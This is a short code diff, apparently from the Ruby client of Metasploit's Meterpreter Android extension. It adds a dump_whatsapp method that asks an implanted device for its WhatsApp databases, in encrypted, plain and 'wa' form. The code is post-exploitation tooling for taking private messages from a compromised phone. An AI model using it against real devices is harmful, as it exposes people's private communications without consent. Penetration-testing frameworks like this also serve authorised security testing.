@@ -122,6 +122,20 @@ class Android < Extension
     return is_rooted
   end
   
+  def dump_whatsapp
+    dbstore = Hash.new
+    request = Packet.create_request('dump_whatsapp')
+    response = client.send_request(request)
+
+    dbstore =
+    {
+      'encrypted' => response.get_tlv(TLV_TYPE_WHATSAPP_ENCRYPTED).value,
+      'plain'     => response.get_tlv(TLV_TYPE_WHATSAPP_PLAIN).value,
+      'wa'        => response.get_tlv(TLV_TYPE_WHATSAPP_WA).value
+    }
+    return dbstore
+  end
+
 end
 
 end; end; end; end; end
